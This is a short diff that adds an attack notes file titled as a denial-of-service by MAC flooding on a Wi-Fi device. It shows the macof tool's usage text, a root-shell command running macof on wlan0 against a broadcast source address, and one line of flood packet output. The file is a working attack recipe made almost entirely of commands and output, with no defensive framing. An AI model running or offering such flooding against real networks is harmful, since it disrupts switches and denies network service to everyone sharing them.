@@ -1,1 +1,16 @@
+-------------------------------------- DOS Attack by MAC FLOODING on Wifi device --------------------------------------------------
 
+# make sure adaptor is connected
+
+┌──(root㉿Windows)-[~]
+└─# macof -h                      
+Version: 2.4
+Usage: macof [-s src] [-d dst] [-e tha] [-x sport] [-y dport]
+             [-i interface] [-n times]
+
+
+# make sure machine is using wifi adaptor for internet
+
+┌──(root㉿Windows)-[~]
+└─# macof -i wlan0 -s 192.168.1.255
+4f:e5:8b:43:79:0 c6:57:c3:2e:fd:31 192.168.1.255.9168 > 0.0.0.0.50285: S 1028755514:1028755514(0) win 512
